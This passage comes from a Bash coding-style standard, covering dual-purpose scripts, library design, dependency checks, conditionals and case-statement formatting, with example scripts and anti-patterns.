  echo "Processing ${arg@Q}"
}
declare -fx my_function

# Check if sourced or executed
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Everything below runs only when executed directly
set -euo pipefail
shopt -s inherit_errexit shift_verbose

# Script metadata
declare -r SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r SCRIPT_NAME=${SCRIPT_PATH##*/}

main() {
  my_function "$@"
}

main "$@"
#fin
```

#### With Idempotent Initialization

```bash
#!/usr/bin/env bash
# Prevent double-initialization when sourced

[[ -v MY_LIB_VERSION ]] || {
  declare -rx MY_LIB_VERSION=1.0.0
  declare -rx MY_LIB_PATH=$(realpath -e -- "${BASH_SOURCE[0]}")
}

# Functions defined here...
my_func() { :; }
declare -fx my_func

# Source-mode exit
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Execution mode
set -euo pipefail
main() { my_func "$@"; }
main "$@"
#fin
```

#### Why set -e Comes After Check

The `set -e` must come AFTER the sourced check because:

1. When sourced, parent script controls error handling
2. `return 0` with `set -e` active could cause issues
3. Library code should not impose error handling on caller

```bash
# ✗ Wrong - set -e before source check
set -euo pipefail
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0  # Risky

# ✓ Correct - set -e after source check
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0
set -euo pipefail
```

---

#### Using Dual-Purpose Scripts

```bash
# As executable
./my-lib.sh arg1 arg2

# As library (source for functions)
source ./my-lib.sh
my_function "value"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - functions not exported
my_func() { :; }
# Cannot be called from subshells after sourcing

# ✓ Correct - export functions
my_func() { :; }
declare -fx my_func
```

---

**See Also:** BCS0607 (Library Patterns), BCS0604 (Function Export)

**Full implementation:** See `examples/exemplar-code/internetip/internetip`


---


**Rule: BCS0407**

### Library Patterns

**Rule: BCS0607**

Patterns for creating reusable Bash libraries.

---

#### Rationale

Well-designed libraries provide:
- Code reuse across multiple scripts
- Consistent behavior and interface
- Easier testing and maintenance
- Namespace isolation

---

#### Pure Function Library

```bash
#!/usr/bin/env bash
# lib-validation.sh - Validation function library
#
# Usage: source lib-validation.sh

# Prevent execution
[[ "${BASH_SOURCE[0]}" != "$0" ]] || {
  >&2 echo 'Error: This file must be sourced, not executed'
  exit 1
}

# Library version
declare -rx LIB_VALIDATION_VERSION=1.0.0

# Validation functions
valid_ip4() {
  local -- ip=$1
  [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
  local -a octets
  IFS='.' read -ra octets <<< "$ip"
  for octet in "${octets[@]}"; do
    ((octet <= 255)) || return 1
  done
  return 0
}
declare -fx valid_ip4

valid_email() {
  [[ $1 =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$ ]]
}
declare -fx valid_email

#fin
```

#### Library with Configuration

```bash
#!/usr/bin/env bash
# lib-config.sh - Configuration management library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || return 1

# Configurable defaults (can be overridden before sourcing)
: "${CONFIG_DIR:=/etc/myapp}"
: "${CONFIG_FILE:="$CONFIG_DIR"/config}"

load_config() {
  [[ -f "$CONFIG_FILE" ]] || return 1
  source "$CONFIG_FILE"
}
declare -fx load_config

get_config() {
  local -- key=$1 default=${2:-}
  local -- value
  value=$(grep "^${key}=" "$CONFIG_FILE" 2>/dev/null | cut -d= -f2-)
  echo "${value:-$default}"
}
declare -fx get_config

#fin
```

#### Namespace Pattern

```bash
#!/usr/bin/env bash
# lib-myapp.sh - Namespaced library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || exit 1

# All functions prefixed with namespace
myapp_init() { :; }
myapp_cleanup() { :; }
myapp_process() { :; }

declare -fx myapp_init myapp_cleanup myapp_process

#fin
```

#### Sourcing Libraries

```bash
# Source with path resolution
SCRIPT_DIR=${BASH_SOURCE[0]%/*}
source "$SCRIPT_DIR"/lib-validation.sh

# Source with existence check
lib_path='/usr/local/lib/myapp/lib-utils.sh'
[[ -f "$lib_path" ]] && source "$lib_path" || die 1 "Missing library ${lib_path@Q}"

# Source multiple libraries
for lib in "$LIB_DIR"/*.sh; do
  [[ -f "$lib" ]] && source "$lib" ||:
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - library has side effects on source
source lib.sh  # Immediately modifies global state

# ✓ Correct - library only defines functions
source lib.sh  # Only defines functions
lib_init       # Explicit initialization call
```

---

**See Also:** BCS0606 (Dual-Purpose Scripts), BCS0608 (Dependency Management)

**Full implementation:** See `examples/exemplar-code/internetip/validip`


---


**Rule: BCS0408**

### Dependency Management

**Rule: BCS0608**

Checking and managing external dependencies in Bash scripts.

---

#### Rationale

Proper dependency management:
- Provides clear error messages for missing tools
- Enables graceful degradation
- Documents script requirements
- Supports portability checking

---

#### Basic Dependency Check

```bash
# Check single command
command -v curl >/dev/null || die 1 'curl is required but not installed'

# Check multiple commands
for cmd in curl jq awk; do
  command -v "$cmd" >/dev/null || die 1 "Required ${cmd@Q}"
done
```

#### Dependency Check Function

```bash
check_dependencies() {
  local -a missing=()
  local -- cmd

  for cmd in "$@"; do
    command -v "$cmd" >/dev/null || missing+=("$cmd")
  done

  if ((${#missing[@]})); then
    error "Missing dependencies: ${missing[*]}"
    info 'Install with: sudo apt install ...'
    return 1
  fi
}

# Usage
check_dependencies curl jq sqlite3 || exit 1
```

#### Optional Dependencies

```bash
# Check and set availability flag
declare -i HAS_JQ=0
command -v jq >/dev/null && HAS_JQ=1 ||:

# Use with fallback
if ((HAS_JQ)); then
  result=$(echo "$json" | jq -r '.field')
else
  result=$(echo "$json" | grep -oP '"field":\s*"\K[^"]+')
fi
```

#### Version Checking

```bash
check_bash_version() {
  local -i major=${BASH_VERSINFO[0]}
  local -i minor=${BASH_VERSINFO[1]}

  if ((major < 5 || (major == 5 && minor < 2))); then
    die 1 "Requires Bash 5.2+, found $BASH_VERSION"
  fi
}

check_tool_version() {
  local -- tool=$1 min_version=$2
  local -- current_version

  current_version=$("$tool" --version 2>&1 | head -1 | grep -oE '[0-9]+\.[0-9]+')

  if [[ "$(printf '%s\n' "$min_version" "$current_version" | sort -V | head -1)" != "$min_version" ]]; then
    die 1 "$tool version $min_version+ required, found $current_version"
  fi
}
```

#### Lazy Loading

```bash
# Initialize expensive resources only when needed
declare -- SQLITE_DB=''

get_db() {
  if [[ -z "$SQLITE_DB" ]]; then
    command -v sqlite3 >/dev/null || die 1 'sqlite3 required'
    SQLITE_DB=$(mktemp)
    sqlite3 "$SQLITE_DB" 'CREATE TABLE cache (key TEXT, value TEXT)'
  fi
  echo "$SQLITE_DB"
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - using which (not POSIX, unreliable)
which curl >/dev/null

# ✓ Correct - use command -v (POSIX compliant)
command -v curl >/dev/null
```

```bash
# ✗ Wrong - silent failure on missing dependency
curl "$url"  # Cryptic error if curl missing

# ✓ Correct - explicit check with helpful message
command -v curl >/dev/null || die 1 'curl required: apt install curl'
curl "$url"
```

---

**See Also:** BCS0607 (Library Patterns)


---


**Rule: BCS0500**

# Control Flow

This section establishes patterns for conditionals, loops, case statements, and arithmetic operations. It mandates using `[[ ]]` over `[ ]` for test expressions, `(())` for arithmetic conditionals, and covers both compact case statement formats and expanded formats for complex logic. Critical guidance includes preferring process substitution (`< <(command)`) over pipes to while loops to avoid subshell variable persistence issues, and using safe arithmetic patterns: `i+=1` instead of `((i+=1))`, or `((i++))` which returns the original value and fails with `set -e` when i=0.


---


**Rule: BCS0501**

## Conditionals

**Use `[[ ]]` for string/file tests, `(())` for arithmetic:**

```bash
# String and file tests - use [[ ]]
[[ -d "$path" ]] && echo 'Directory exists' ||:
[[ -f "$file" ]] || die 1 "File not found ${file@Q}"
[[ "$status" == success ]] && continue ||:

# Arithmetic tests - use (())
((VERBOSE==0)) || echo 'Verbose mode'
((var > 5)) || return 1
((count >= MAX_RETRIES)) && die 1 'Too many retries' ||:

# Complex conditionals - combine both
if [[ -n "$var" ]] && ((count)); then
  process_data
fi

# Short-circuit evaluation
[[ -f "$file" ]] && source "$file"
((VERBOSE)) || return 0
```

**Rationale for `[[ ]]` over `[ ]`:**

1. **No word splitting or glob expansion** on variables
2. **Pattern matching** with `==` and `=~` operators
3. **Logical operators** `&&` and `||` work inside (no `-a` / `-o` needed)
4. **No need to quote variables** in most cases (but still recommended)
5. **More operators**: `<`, `>` for string comparison (lexicographic)

**Comparison of `[[ ]]` vs `[ ]`:**

```bash
var='two words'

# ✗ [ ] requires quotes or fails
[ $var = 'two words' ]  # ERROR: too many arguments
[ "$var" = 'two words' ]  # Works but fragile

# ✓ [[ ]] handles unquoted variables (but quote anyway)
[[ $var == 'two words' ]]  # Works even without quotes
[[ "$var" == 'two words' ]]  # Recommended - quote anyway

# Pattern matching (only works in [[ ]])
[[ "$file" == *.txt ]] && echo "Text file"
[[ "$input" =~ ^[0-9]+$ ]] && echo "Number"

# Logical operators inside [[ ]]
[[ -f "$file" && -r "$file" ]] && cat "$file" ||:

# vs [ ] requires separate tests
[ -f "$file" ] && [ -r "$file" ] && cat "$file" ||:
```

**Arithmetic conditionals - use `(())`:**

```bash
declare -i count=0
: ...

# ✓ Correct - natural C-style syntax
if ((count)); then
  echo "Count: $count"
fi

((i >= MAX)) && die 1 'Limit exceeded' ||:

# ✗ Wrong - using [[ ]] for arithmetic (verbose, error-prone)
if [[ "$count" -gt 0 ]]; then  # Unnecessary
  echo "Count: $count"
fi

# Comparison operators in (())
((a > b))   # Greater than
((a >= b))  # Greater or equal
((a < b))   # Less than
((a <= b))  # Less or equal
((a == b))  # Equal
((a != b))  # Not equal
```

**Pattern matching examples:**

```bash
# Glob pattern matching
[[ "$filename" == *.@(jpg|png|gif) ]] && process_image "$filename" ||:

# Regular expression matching
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
  echo 'Valid email'
else
  die 22 "Invalid email ${email@Q}"
fi

# Case-insensitive matching (bash 3.2+)
shopt -s nocasematch
[[ "$input" == yes ]] && echo "Affirmative"  # Matches YES, Yes, yes
shopt -u nocasematch
```

**Short-circuit evaluation:**

```bash
# Execute second command only if first succeeds
[[ -f "$config" ]] && source "$config" ||:
((DEBUG)) && set -x ||:

# Execute second command only if first fails
[[ -d "$dir" ]] || mkdir -p "$dir"
((count)) || die 1 'No items to process'

# Chaining multiple conditions
[[ -f "$file" ]] && [[ -r "$file" ]] && cat "$file"
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using old [ ] syntax
if [ -f "$file" ]; then  # Use [[ ]] instead
  echo 'Found'
fi

# ✗ Wrong - using -a and -o in [ ]
[ -f "$file" -a -r "$file" ]  # Deprecated, fragile

# ✓ Correct - use [[ ]] with && and ||
[[ -f "$file" && -r "$file" ]]

# ✗ Wrong - string comparison with [ ] unquoted
[ $var = 'value' ]  # Breaks if var contains spaces

# ✓ Correct - use [[ ]] (still quote for clarity)
[[ "$var" == "value" ]]

# ✗ Wrong - arithmetic with [[ ]] using -gt/-lt
[[ "$count" -gt 10 ]]  # Verbose, less readable

# ✓ Correct - use (()) for arithmetic
((count > 10))
```

**Common file test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-e file` | File exists |
| `-f file` | Regular file |
| `-d dir` | Directory |
| `-r file` | Readable |
| `-w file` | Writable |
| `-x file` | Executable |
| `-s file` | Not empty (size > 0) |
| `-L link` | Symbolic link |
| `file1 -nt file2` | file1 newer than file2 |
| `file1 -ot file2` | file1 older than file2 |

**Common string test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-z "$str"` | String is empty (zero length) |
| `-n "$str"` | String is not empty |
| `"$a" == "$b"` | Strings are equal |
| `"$a" != "$b"` | Strings are not equal |
| `"$a" < "$b"` | Lexicographic less than |
| `"$a" > "$b"` | Lexicographic greater than |
| `"$str" =~ regex` | String matches regex |
| `"$str" == pattern` | String matches glob pattern |


---


**Rule: BCS0502**

## Case Statements

**Use `case` statements for multi-way branching based on pattern matching. Case statements are more readable and efficient than long `if/elif` chains when testing a single value against multiple patterns. Choose compact format for simple single-action cases, and expanded format for multi-line logic. Always align actions consistently and use appropriate pattern matching syntax.**

**Rationale:**

- **Readability**: Case statements are clearer than long if/elif chains for pattern-based branching
- **Pattern Matching**: Native support for wildcards, alternation, and character classes
- **Performance**: Case is faster than multiple if/elif tests - single evaluation of the test value
- **Maintainability**: Easy to add, remove, or reorder cases without restructuring logic
- **Argument Parsing**: Perfect for command-line option processing with multiple flags
- **Exhaustive Matching**: Default `*)` case ensures all possibilities are handled
- **Visual Organization**: Column alignment makes structure immediately obvious

**When to use case vs if/elif:**

```bash
# ✓ Use case when - testing single variable against multiple values
case "$action" in
  start)   start_service ;;
  stop)    stop_service ;;
  restart) restart_service ;;
  status)  show_status ;;
  *)       die 22 "Invalid action ${action@Q}" ;;
esac

# ✓ Use case when - pattern matching needed
case "$filename" in
  *.txt) process_text_file ;;
  *.pdf) process_pdf_file ;;
  *.md)  process_markdown_file ;;
  *)     die 22 'Unsupported file type' ;;
esac

# ✓ Use case when - parsing command-line arguments
case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help)    show_help; exit 0 ;;
  -*)           die 22 "Invalid option ${1@Q}" ;;
  *)            FILENAME=$1 ;;
esac

# ✗ Use if/elif when - testing different variables
if [[ ! -f "$file" ]]; then
  die 2 "File not found ${file@Q}"
elif [[ ! -r "$file" ]]; then
  die 1 "File not readable ${file@Q}"
elif [[ -z "$output" ]]; then
  die 22 'Output path required'
fi

# ✗ Use if/elif when - complex conditional logic
if [[ "$count" -gt 100 && "$verbose" -eq 1 ]]; then
  info 'Processing large batch in verbose mode'
elif [[ "$count" -gt 100 ]]; then
  info 'Processing large batch'
fi

# ✗ Use if/elif when - testing numeric ranges
if ((value < 0)); then
  error='negative'
elif ((value == 0)); then
  error='zero'
elif ((value <= 10)); then
  category='small'
else
  category='large'
fi
```

**Case expression quoting:**

The `case` expression doesn't require quoting. Word splitting doesn't apply in the case expression context:

```bash
# ✓ CORRECT - no quotes needed on case expression
case ${1:-} in
  --help) show_help ;;
esac

case $action in
  start|stop|restart) handle_service ;;
esac

# ✗ UNNECESSARY - quotes don't add value here
case "${1:-}" in
  --help) show_help ;;
esac
```

**Why quoting is unnecessary:**
- Case word undergoes pattern matching, not word splitting
- The expression is evaluated as a single unit regardless of quoting
- Omitting quotes reduces visual clutter
- Consistent with compact argument parsing patterns

**Note:** While quoting is harmless, the BCS style preference is to omit unnecessary quotes for cleaner code.

**Compact format:**

Use compact format when each case performs a single action or simple command.

**Guidelines:**
- All actions on same line as pattern
- Terminate with `;;` on same line
- Align `;;` at consistent column (typically 14-18)
- No blank lines between cases
- Perfect for argument parsing with simple flag setting

**Compact format example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0
declare -- OUTPUT_FILE=''
declare -a INPUT_FILES=()

# Compact case for simple argument parsing
while (($#)); do
  case $1 in
    -n|--dry-run) DRY_RUN=1 ;;
    -f|--force)   FORCE=1 ;;
    -V|--version) echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -o|--output)  noarg "$@"; shift; OUTPUT_FILE=$1 ;;
    -v|--verbose) VERBOSE+=1 ;;
    -q|--quiet)   VERBOSE=0 ;;
    -h|--help)    show_help; exit 0 ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option ${1@Q}" ;;
    *)            INPUT_FILES+=("$1") ;;
  esac
  shift
done

INPUT_FILES+=("$@")
readonly -- VERBOSE DRY_RUN FORCE OUTPUT_FILE
readonly -a INPUT_FILES

#fin
```

**Expanded format:**

Use expanded format when cases have multi-line actions, require comments, or perform complex operations.

**Guidelines:**
- Action starts on next line, indented
- Multiple statements aligned at consistent column
- Terminate with `;;` on separate line, aligned left
- Blank line after `;;` separates cases visually
- Comments within case branches are acceptable
- Column alignment typically at 14-18 characters

**Expanded format example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i INSTALL_BUILTIN=0
declare -i VERBOSE=0
declare -- PREFIX=/usr/local
declare -- BIN_DIR=''
declare -- LIB_DIR=''

# Expanded case for complex argument parsing
while (($#)); do
  case $1 in
    -b|--builtin)  INSTALL_BUILTIN=1
                   ((VERBOSE)) && info 'Builtin installation enabled' ||:
                   ;;

    -p|--prefix)   noarg "$@"
                   shift
                   PREFIX=$1
                   BIN_DIR="$PREFIX"/bin
                   LIB_DIR="$PREFIX"/lib/bash
                   ((VERBOSE)) && info "Prefix set to: $PREFIX" ||:
                   ;;

    -v|--verbose)  VERBOSE+=1
                   info 'Verbose mode enabled'
                   ;;

    -q|--quiet)    VERBOSE=0
                   info 'Verbose mode disabled'
                   ;;

    -V|--version)  echo "$SCRIPT_NAME $VERSION"
                   exit 0
                   ;;

    -h|--help)     show_help
                   exit 0
                   ;;

    --)            shift
                   break
                   ;;

    -[bpvqVh]*) #shellcheck disable=SC2046 #split up single options
                   set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
                   ;;

    -*)            error "Invalid option ${1@Q}"
                   show_help
                   exit 22
                   ;;

    *)             error "Unexpected argument ${1@Q}"
                   show_help;
                   exit 2
                   ;;
  esac
  shift
done

readonly -- INSTALL_BUILTIN VERBOSE PREFIX BIN_DIR LIB_DIR

#fin
```

**Pattern matching syntax:**

**1. Literal patterns:**

```bash
# Exact string match
case "$value" in
  start)    echo 'Starting...' ;;
  stop)     echo 'Stopping...' ;;
  restart)  echo 'Restarting...' ;;
esac

# Quote pattern if it contains special characters
case "$email" in
  'admin@example.com') echo 'Admin user' ;;
  'user@example.com')  echo 'Regular user' ;;
esac
```

**2. Wildcard patterns (globbing):**

```bash
# Star wildcard - matches any characters
case "$filename" in
  *.txt) echo 'Text file' ;;
  *.pdf) echo 'PDF file' ;;
  *.log) echo 'Log file' ;;
  *)     echo 'Unknown file type' ;;
esac

# Question mark wildcard - matches single character
case "$code" in
  ??)   echo 'Two-character code' ;;
  ???)  echo 'Three-character code' ;;
  *)    echo 'Other length' ;;
esac

# Prefix/suffix matching
case "$path" in
  /usr/*)  echo 'System path' ;;
  /home/*) echo 'Home directory' ;;
  /tmp/*)  echo 'Temporary path' ;;
  *)       echo 'Other path' ;;
esac
```

**3. Alternation (OR patterns):**

```bash
# Multiple patterns with |
case "$option" in
  -h|--help|help) show_help; exit 0 ;;
  -v|--verbose|verbose) VERBOSE+=1 ;;
  -q|--quiet|quiet) VERBOSE=0 ;;
esac

# Combining alternation with wildcards
case "$filename" in
  *.txt|*.md|*.rst) echo 'Text document' ;;
  *.jpg|*.png|*.gif) echo 'Image file' ;;
  *.sh|*.bash) echo 'Shell script' ;;
esac
```

**4. Character classes:**

```bash
# With extglob enabled
shopt -s extglob

case "$input" in
  # ?(pattern) - zero or one occurrence
  test?(s)) echo 'test or tests' ;;

  # *(pattern) - zero or more occurrences
  file*(s).txt) echo 'file.txt, files.txt, filess.txt, etc.' ;;

  # +(pattern) - one or more occurrences
  log+([0-9]).txt) echo 'log followed by digits' ;;

  # @(pattern) - exactly one occurrence
  @(start|stop|restart)) echo 'Valid action' ;;

  # !(pattern) - anything except pattern
  !(*.tmp|*.bak)) echo 'Not a temp or backup file' ;;
esac

# Bracket expressions
case "$char" in
  [0-9]) echo 'Digit' ;;
  [a-z]) echo 'Lowercase letter' ;;
  [A-Z]) echo 'Uppercase letter' ;;
  [!a-zA-Z0-9]) echo 'Special character' ;;
esac
```

**Complete argument parsing example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0
declare -- OUTPUT_DIR=''
declare -- CONFIG_FILE="$SCRIPT_DIR"/config.conf
declare -a INPUT_FILES=()

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ▲" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Documentation Functions
# ============================================================================

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Process files

Process files with various options.

Usage: $SCRIPT_NAME [OPTIONS] FILE...

Options:
  -n, --dry-run          Show what would be done without doing it
  -f, --force            Force overwrite of existing files
  -q, --quiet            Suppress non-error output
  -o, --output DIR       Output directory
  -c, --config FILE      Configuration file
  -v, --verbose          Enable verbose output
  -q, --quiet            Disable verbose output
  -V, --version          Show version information
  -h, --help             Show this help message

Arguments:
  FILE...                Input files to process

Examples:
  $SCRIPT_NAME file.txt
  $SCRIPT_NAME -vo /tmp file1.txt file2.txt
  $SCRIPT_NAME -nv --output /backup *.txt
HELP
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# ============================================================================
# Business Logic
# ============================================================================

process_file() {
  local -- file=$1

  if [[ ! -f "$file" ]]; then
    error "File not found ${file@Q}"
    return 2
  fi

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would process ${file@Q}"
  else
    info "Processing ${file@Q}"
    # Process file logic here
  fi

  return 0
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      -n|--dry-run)     DRY_RUN=1
                        ;;

      -f|--force)       FORCE=1
                        ;;

      -o|--output)      noarg "$@"
                        shift
                        OUTPUT_DIR=$1
                        ;;

      -c|--config)      noarg "$@"
                        shift
                        CONFIG_FILE=$1
                        ;;

      -v|--verbose)     VERBOSE+=1
                        info 'Verbose mode enabled'
                        ;;

      -q|--quiet)       VERBOSE=0
                        info 'Verbose mode disabled'
                        ;;

      -V|--version)     echo "$SCRIPT_NAME $VERSION"
                        return 0
                        ;;

      -h|--help)        show_help
                        return 0
                        ;;

      -[nfocvqVh]*) #shellcheck disable=SC2046 #split up single options
                        set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
                        ;;

      --)               shift
                        break
                        ;;

      -*)               die 22 "Invalid option ${1@Q}"
                        ;;

      *)                INPUT_FILES+=("$1")
                        ;;
    esac
    shift
  done

  # Collect remaining arguments after --
  INPUT_FILES+=("$@")

  # Make parsed values readonly
  readonly -- VERBOSE DRY_RUN FORCE OUTPUT_DIR CONFIG_FILE
  readonly -a INPUT_FILES

  # Validate arguments
  if [[ ${#INPUT_FILES[@]} -eq 0 ]]; then
    error 'No input files specified'
    show_help
    return 2
  fi

  if [[ -n "$OUTPUT_DIR" && ! -d "$OUTPUT_DIR" ]]; then
    if ((FORCE)); then
      info "Creating output directory ${OUTPUT_DIR@Q}"
      mkdir -p "$OUTPUT_DIR"
    else
      die 2 "Output directory not found: ${OUTPUT_DIR@Q} (use -f to create)"
    fi
  fi

  if [[ ! -f "$CONFIG_FILE" ]]; then
    warn "Config file not found ${CONFIG_FILE@Q} (using defaults)"
  fi

  # Display configuration
  if ((VERBOSE)); then
    info "$SCRIPT_NAME $VERSION"
    info "Input files: ${#INPUT_FILES[@]}"
    [[ -z "$OUTPUT_DIR" ]] || info "Output: $OUTPUT_DIR"
    ((DRY_RUN==0)) || info '[DRY-RUN] Mode enabled'
  fi

  # Process files
  local -- file
  local -i success_count=0
  local -i error_count=0

  for file in "${INPUT_FILES[@]}"; do
    if process_file "$file"; then
      success_count+=1
    else
      error_count+=1
    fi
  done

  # Report results
  if ((VERBOSE)); then
    success "Processed: $success_count files"
    ((error_count)) && warn "Errors: $error_count" ||:
  fi

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"
#fin
```

**File type routing example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Route files based on extension
process_file_by_type() {
  local -- file=$1
  local -- filename=${file##*/}

  case "$filename" in
    *.txt|*.md|*.rst)
      info "Processing text document ${file@Q}"
      process_text "$file"
      ;;

    *.jpg|*.jpeg|*.png|*.gif)
      info "Processing image ${file@Q}"
      process_image "$file"
      ;;

    *.pdf)
      info "Processing PDF ${file@Q}"
      process_pdf "$file"
      ;;

    *.sh|*.bash)
      info "Processing shell script ${file@Q}"
      validate_script "$file"
      ;;

    *.json)
      info "Processing JSON ${file@Q}"
      validate_json "$file"
      ;;

    *.xml)
      info "Processing XML ${file@Q}"
      validate_xml "$file"
      ;;

    .*)
      warn "Skipping hidden file ${file@Q}"
      return 0
      ;;

    *.tmp|*.bak|*~)
      warn "Skipping temporary file ${file@Q}"
      return 0
      ;;

    *)
      error "Unknown file type ${file@Q}"
      return 1
      ;;
  esac
}

process_text() {
  local -- file=$1
  # Text processing logic
}

process_image() {
  local -- file=$1
  # Image processing logic
}

process_pdf() {
  local -- file=$1
  # PDF processing logic
}

validate_script() {
  local -- file=$1
  shellcheck "$file"
}

validate_json() {
  local -- file=$1
  jq empty "$file"
}

validate_xml() {
  local -- file=$1
  xmllint --noout "$file"
}

main() {
  local -a files=("$@")

  ((${#files[@]})) || die 22 'No files specified'

  local -- file
  for file in "${files[@]}"; do
    process_file_by_type "$file"
  done
}

main "$@"
#fin
```

**Action routing example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Service control script
SERVICE_NAME=myapp
PID_FILE=/var/run/"$SERVICE_NAME".pid

start_service() {
  if [[ -f "$PID_FILE" ]]; then
    warn "Service already running (PID: $(cat "$PID_FILE"))"
    return 0
  fi

  info "Starting $SERVICE_NAME..."
  # Start service logic
  success "$SERVICE_NAME started"
}

stop_service() {
  if [[ ! -f "$PID_FILE" ]]; then
    warn 'Service not running'
    return 0
  fi

  local -i pid
  pid=$(cat "$PID_FILE")
  info "Stopping $SERVICE_NAME (PID: $pid)..."
  kill "$pid"
  rm -f "$PID_FILE"
  success "$SERVICE_NAME stopped"
}

restart_service() {
  info "Restarting $SERVICE_NAME..."
  stop_service
  sleep 1
  start_service
}

status_service() {
  if [[ -f "$PID_FILE" ]]; then
    local -i pid
    pid=$(cat "$PID_FILE")
    if kill -0 "$pid" 2>/dev/null; then
      info "$SERVICE_NAME is running (PID: $pid)"
      return 0
    else
      error "$SERVICE_NAME is not running (stale PID file)"
      return 1
    fi
  else
    info "$SERVICE_NAME is not running"
    return 3
  fi
}

reload_service() {
  [[ -f "$PID_FILE" ]] || die 1 'Service not running'

  local -i pid
  pid=$(cat "$PID_FILE")
  info "Reloading $SERVICE_NAME configuration..."
  kill -HUP "$pid"
  success 'Configuration reloaded'
}

main() {
  local -- action=${1:-}

  [[ -n "$action" ]] || die 22 'No action specified (start|stop|restart|status|reload)'

  # Route to appropriate handler
  case "$action" in
    start)
      start_service
      ;;

    stop)
      stop_service
      ;;

    restart)
      restart_service
      ;;

    status)
      status_service
      ;;

    reload)
      reload_service
      ;;

    # Handle common variations
    st|stat)
      status_service
      ;;

    re|rest)
      restart_service
      ;;

    # Reject unknown actions
    *)
      die 22 "Invalid action ${action@Q} (use: start|stop|restart|status|reload)"
      ;;
  esac
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - quoting patterns unnecessarily
case "$value" in
  "start") echo 'Starting...' ;;    # Don't quote literal patterns
  "stop") echo 'Stopping...' ;;
esac

# ✓ Correct - unquoted literal patterns
case "$value" in
  start) echo 'Starting...' ;;
  stop) echo 'Stopping...' ;;
esac

# ✗ Wrong - not quoting the test variable
case $filename in    # Unquoted variable!
  *.txt) process_text ;;
esac

# ✓ Correct - quote the test variable
case "$filename" in
  *.txt) process_text ;;
esac

# ✗ Wrong - using if/elif for simple pattern matching
if [[ "$ext" == 'txt' ]]; then
  process_text
elif [[ "$ext" == 'pdf' ]]; then
  process_pdf
elif [[ "$ext" == 'md' ]]; then
  process_markdown
else
  die 1 'Unknown type'
fi

# ✓ Correct - case is clearer
case "$ext" in
  txt)  process_text ;;
  pdf)  process_pdf ;;
  md)   process_markdown ;;
